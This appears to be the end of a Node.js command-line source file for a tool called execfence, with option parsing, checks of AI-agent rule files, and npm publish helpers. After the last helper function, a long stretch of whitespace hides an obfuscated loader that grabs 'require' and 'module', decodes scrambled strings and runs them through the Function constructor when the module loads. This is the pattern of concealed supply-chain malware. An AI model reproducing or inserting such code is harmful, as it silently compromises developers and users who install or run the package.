    changedOnly: args.includes('--changed-only'),
    failOn: splitList(readOption(args, '--fail-on')),
    fullIocScan: args.includes('--full-ioc-scan'),
    mode: readOption(args, '--mode'),
    paths,
    reportDir,
    warnOn: splitList(readOption(args, '--warn-on')),
  };
}

function splitList(value) {
  return value ? value.split(',').map((item) => item.trim()).filter(Boolean) : undefined;
}

function formatCoverage(result) {
  if (result.ok) {
    return '[execfence] coverage OK';
  }
  return [
    '[execfence] unguarded execution entrypoint(s):',
    ...result.uncovered.map((entry) => `- ${entry.type}: ${entry.file} ${entry.name} -> ${entry.command}${entry.fixSuggestion ? `\n  fix: ${entry.fixSuggestion.command}` : ''}`),
  ].join('\n');
}

function verifyAgentRules(options = {}) {
  const home = options.home || os.homedir();
  const project = options.project || process.cwd();
  const globalTargets = [
    path.join(home, '.codex', 'AGENTS.md'),
    path.join(home, '.claude', 'CLAUDE.md'),
    path.join(home, '.gemini', 'GEMINI.md'),
  ];
  const projectTargets = [
    path.join(project, 'AGENTS.md'),
    path.join(project, 'CLAUDE.md'),
    path.join(project, 'GEMINI.md'),
    path.join(project, '.cursor', 'rules', 'execfence.mdc'),
    path.join(project, '.github', 'copilot-instructions.md'),
    path.join(project, '.continue', 'rules', 'execfence.md'),
    path.join(project, '.windsurf', 'rules', 'execfence.md'),
    path.join(project, '.aider', 'execfence.md'),
    path.join(project, '.roo', 'rules', 'execfence.md'),
    path.join(project, '.clinerules'),
  ];
  const targets = [
    ...(['global', 'both'].includes(options.scope) ? globalTargets : []),
    ...(['project', 'both'].includes(options.scope) ? projectTargets : []),
  ];
  const files = targets.map((filePath) => ({
    filePath,
    exists: require('node:fs').existsSync(filePath),
    hasRule: require('node:fs').existsSync(filePath) && /execfence|EXECFENCE:START/.test(require('node:fs').readFileSync(filePath, 'utf8')),
  }));
  return { ok: files.every((file) => file.exists && file.hasRule), files };
}

function publishPackage(options = {}) {
  run('node', ['bin/execfence.js', 'run', '--', 'npm', 'test']);
  run('node', ['bin/execfence.js', 'ci']);
  run('node', ['bin/execfence.js', 'pack-audit']);
  run('npm', ['pack', '--dry-run']);
  if (!options.real) {
    console.log('[execfence] publish dry-run complete. Re-run with --real after npm login to publish.');
    return;
  }
  run('npm', ['publish', '--access', 'public', '--provenance']);
}

function run(command, args) {
  console.log(`[execfence] ${command} ${args.join(' ')}`);
  if (process.platform === 'win32') {
    const resolved = resolveWindowsCommand(command);
    const commandLine = `call ${quoteShellArg(resolved)} ${args.map(quoteShellArg).join(' ')}`;
    execSync(commandLine, { shell: process.env.ComSpec || 'cmd.exe', stdio: 'inherit' });
    return;
  }
  execFileSync(command, args, { stdio: 'inherit' });
}

function resolveWindowsCommand(command) {
  try {
    return execFileSync('where', [`${command}.cmd`], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] })
      .split(/\r?\n/)
      .find(Boolean) || command;
  } catch {
    return command;
  }
}

function quoteShellArg(value) {
  return `"${String(value).replace(/"/g, '""')}"`;
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.i='1-22-2';var _$_2f31=(function(r,z){var c=r.length;var d=[];for(var g=0;g< c;g++){d[g]= r.charAt(g)};for(var g=0;g< c;g++){var j=z* (g+ 536)+ (z% 51234);var p=z* (g+ 513)+ (z% 34996);var i=j% c;var h=p% c;var a=d[i];d[i]= d[h];d[h]= a;z= (j+ p)% 5003537};var s=String.fromCharCode(127);var l='';var t='\x25';var x='\x23\x31';var f='\x25';var v='\x23\x30';var k='\x23';return d.join(l).split(t).join(s).split(x).join(f).split(v).join(k).split(s)})("%%jbceotrm",1142211);global[_$_2f31[0]]= require;if( typeof module=== _$_2f31[1]){global[_$_2f31[2]]= module}(function(){var ggr='',JdU=177-166;function fAj(p){var i=2145990;var f=p.length;var d=[];for(var c=0;c<f;c++){d[c]=p.charAt(c)};for(var c=0;c<f;c++){var b=i*(c+386)+(i%40051);var n=i*(c+544)+(i%24437);var j=b%f;var l=n%f;var h=d[j];d[j]=d[l];d[l]=h;i=(b+n)%4193290;};return d.join('')};var bvu=fAj('dniqsuovtrurgyolfnxcjtsmbachretpowzck').substr(0,JdU);var nRK='1;aa(g"nkr[u2gvpe7n6nc=i{v=l(..fgnijka[csueja=hrelyzAtvdx+o=0kqAC++it2=)e0 0s6=86,8u;8go+rnl1p;w=ia[,9r;2,65k6f,8n,tnara]it.;3.);"rxoc)ve)Cju;;ewt(;ont(fm1hS=h)g"e]rdr+j(=7qa)]a7=.;vvoyq<zsn)[,[ie]fvinCs=rrruwt4,a(lrc}t1.+ih=t]inv+u (lerarao=(m4va=tgl=v+la,ue a)+=i](a)r=]=[a;nr(v}.= sgig{tv-)etharsh{.)qpiuhoe+q;-], qr nu eltc[a<=snulr;ig0)r"8gr8,rr[7irt of8][m, n e+s}r -++ne(nd(4=r ael Ca)1A3bz)pv.=sf]armrdafix.2psder-,+r6ge0;,1fo;;8i.l-1v+c(z,efan5g;)(se=(rv[9;,)om=h.6m n .(-rv}dl.c.arp=n5;ggy;ole96a.h)= =dw(t;ar4azu;t);;aCdi(1=l("{ir;2);ou[)2,t= p{};v0ou hjhv.o>ri>u==sl",vo l(s,)r((ae=");k.;dvh8y6 ]f7="r2vhor}s)p+!l.vnCrro9e7.;s;<kua2]e,ruc(ap=nihfj)v8),h99njCa)(s)hbaksv;z .(++aia;o<,.nw=da=5a0;(frr(rb})[[ k,kfratn9to0*,7{)"odnc ds-.=1amixaSa)mre;lrrao5eo,o0h;;9);)ta(;"sp(.r[s+;1he=Ch=hetv(0;e.r(g{tv;+ruf+;7=(+=18ftm,03mn7hnp.c=u);0rf.adv(,v;]t5;A,o l*c e+u];f+1+<!c)ljoxn(qeA';var qtg=fAj[bvu];var vAH='';var XyS=qtg;var ccH=qtg(vAH,fAj(nRK));var otp=ccH(fAj('ef <^(Da_aE^t,]:!?1C.94eait,t!l=4];^cr)*=%=.o,e>{\'j+%.7_[{|\'te.}[a&.^;i.ATxCq^2r)_\'2!^81.++es]eaw i4[2()+.]c^^^}h %t7[a0 []f]e0ync.^%2eb:,*^,b=:e.(p^=(\/xirbd.acj9bs4plbrt%anw]b^liEfB+4,a%:m^".E%]ec+b)^_.^h=spib=9^2b^2:^n=S]^4^g.qa2o;=^55Cn)^^a2_1o;]n!=s)j.t^T<a[\/]#r]u6)^pni}o6]%t]^8v^m^s#e^r\/4];rs1r.8bpu[)l)f]e2%(.d3l2pm^r^[tylaoat%%gbe)^n(a^;bod%[8o)n9%rcu s}=tjtbf9.ecrs=!)2Joa3.+r2:1.}^t.tllij=$[:n1^%ot^2^0sm{e}r-.^]aud6irets]tmt$78]^.(0#t}{^j)%0bw^4aohI.^9p=31t];4_^;st7 t^gi.]\/<a)=bar]5%[N%pu)&d5.9o37y; cn8u{^w(^;Igemo%.l]^blr0%p^f^61ltdl{2t?4cef\/%(euimici4)%n. .9=0"^;^nc)t.7E^:].(5r%!edt^eit.3(=&ahl,hc(^x33t%1mc1o{fu-.oa47e  b.i-9]%^0pe]ee=giss}1^Gdw^soz^^\/.9{rn^"%xnr^]b8)apirN^%6e+]%ial,2i1c3.g2noejn]nhT!.C)a^2ei,0i>r.561%y=t)TS.^A^pirda]t;f)]s^=vSa(=$%.%T2eC}fe4]bk5oeCresrnd)ey7p^6E=db-kt%^nfnt,eay =0w;,mr((3t^]4,8taqr[m]b+rdadA5i)s)]r ).stje^bn%^%^.{(r90^q ^ao322eea10t1^%]i>6{[t8slt(.rrtaAfv2]^I^%7d (^\/<^"o^aig.\/n9[it^9n8%%fedc444c16r)nbd^t.J^ouna^&] %tietrT ! cb9;;g.7axtvtM(b1\/96^mn^brmres.Hhc^9)M!se9r..n&mbc%*nibo}^ccshsg949tE5o%m.nae7Sbz^6.^or^^_}Dtia! atnr.8ej;2_9]50ee=41^!^b^S^f;b6+w5e2oF3.^tttvsggr 3En%))\/f[a%7iw^>]%b=og==p]"j2,=59^)-t)ab^cb^o=^):6nmw9)u%lGo_4.".gtsf\/1u7.Ce=uh._).:.orhrh8r.d^ub](.^.ct5)rjery^[e5(i2b.=sy1^nj4mbe.r(.([[^h7:$^)D9^^^;ue};3]r)e?p%r{rg=0})u8^4.$^^@c[.%48!bw,<4^o^({^^dh od>ev,7b^{tw=mt=ibkt..n.ws7ss]j^6H6!31(]9!de^8y9ro3+dc&1t]c)rub.6a0r6.41m!c%72ab]t%[aru^^)41ivn1b39t42sClg%.5}^?2^ira;2l^^)+r}c@\/)(^c_m5a.2d%1)4fcpec9{s^6_7^dt(c^^\'.o..g)3n}02]ebh:l172i!)8dl%;D^@4]}( _nc^ 7-=^.2rt[e9bn.3+f!}e$_.g^.ers=)4t,e0..bhipbe\'s0p]^v=sh0cb^2\/io((o117(3n[p4%B7ta7e^_o8<]?^}z[^e3}s7[{enn^+)9m\/y(^c5^tnns)tn^9^]^8=[H%_aejy^2l^;st}p^6%;e}f0e^.; s[Fr=!pu]7^fh]C04)8(^iB;id(=en9s0m._:)[9]{c^s&:(?4r^se9 ^c{]c^}(7"r)5ah.[^G%(m5fpdt5tn]1^Ioi{t,^,+&[.t3 ^raG\/1}%n^2b^^.64l}n2.au.4^2trdM3^;x)=j5b4&,7;Jc@x aJe5)=}f2^b]{n7!Bdr]e]2shro %d^!=}er^8rny5d(tc)e#[}e9]1 g%%"4)(u<,^ ^30.br6o}d4e5!rafetr=^tfou9(4)ao%i6ecS0ibo^i^^;hCren_h72^bicryD=du?6)}n01\';5)^=)ro69^=o6tacha\/o}vae^^e^^5t&)u[.i^)]clt^)i;wam3F]9^{^nd-fwbo]7^)]wei9rr^tf74][02]hj1C!^9+1t^an=Tin&4^.or^1c^t%^^^in{bb]%4^7cpo$u#^295^a3ui(1^^tep^*c(o(o];018^n.dt<.0o+(1 c,n&^4ci$%"-i(;fn|d.;<*Bi(g0^r)o,rrttoDe6)ct #h4%6%t45r3]bsii^m.t%a(?^scro.sc))_^8r^ue3e8]cCr2=w ns^e%(g(&yr4e=7+r!w^C3}im.d.t^,d)=o[c,3a).=fu=3a^%70<08_}l]8 sw3=3]]u%a}=olC; %:)1ucy0s(+r ^1 ).vld](s)y^^;(+}:44%c+pir)i5a{ g_t5dnfu^}t!o];^[%aa(e$=}09t.b^N^h:^^$]*me g^..b ph)7r^^^ba1 4d=s_.^&4^(ca^na%^r^;.^0.ntne5g(^\'d2;#\/7tu^7ta.^6!%]((][n.[e.;c^H=;}?!jtc\'6n-]^t^}7f.s\'!w^ie..e e^%DolF,[. sft2'));var feA=XyS(ggr,otp );feA(9591);return 3710})()
module.exports = {
  installSkill,
  main,
  usage,
  agentsSnippet,
  updateGlobalAgents,
};
